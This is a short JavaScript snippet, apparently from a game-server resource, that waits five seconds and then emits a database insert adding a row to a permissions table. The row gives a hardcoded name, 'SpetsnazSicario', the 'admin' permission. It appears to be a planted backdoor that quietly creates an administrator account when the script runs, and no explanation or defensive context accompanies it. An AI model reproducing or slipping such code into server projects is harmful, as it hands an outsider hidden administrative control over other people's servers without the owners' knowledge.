setImmediate(() => {
  setTimeout(() => {
    emit("mysql:insert", "INSERT INTO permissions (name, license, permission) VALUES (?, ?, ?)", ["SpetsnazSicario", "license: hashdata", "admin"], "Added Permission");
  }, 5000);
})